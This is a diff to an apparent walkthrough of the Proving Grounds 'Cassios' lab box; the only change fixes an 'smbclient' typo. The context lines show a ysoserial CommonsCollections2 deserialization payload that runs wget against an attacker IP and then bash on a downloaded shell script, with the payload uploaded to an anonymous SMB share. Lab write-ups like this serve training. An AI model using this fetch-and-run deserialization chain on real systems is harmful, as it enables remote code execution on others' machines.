@@ -9,7 +9,7 @@ java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'wget http://192
 ```
 
 ```
-mbclient --no-pass -N "\\\\192.168.129.116\\Samantha Konstan" -p 445
+smbclient --no-pass -N "\\\\192.168.129.116\\Samantha Konstan" -p 445
 put /home/kali/Documents/OffSecPG/Cassios/recycler.ser recycler.ser
 ```
 
@@ -18,7 +18,7 @@ java -jar ysoserial-master-d367e379d9-1.jar CommonsCollections2 'bash /tmp/shell
 ```
 
 ```
-mbclient --no-pass -N "\\\\192.168.129.116\\Samantha Konstan" -p 445
+smbclient --no-pass -N "\\\\192.168.129.116\\Samantha Konstan" -p 445
 put /home/kali/Documents/OffSecPG/Cassios/recycler.ser recycler.ser
 ```
 
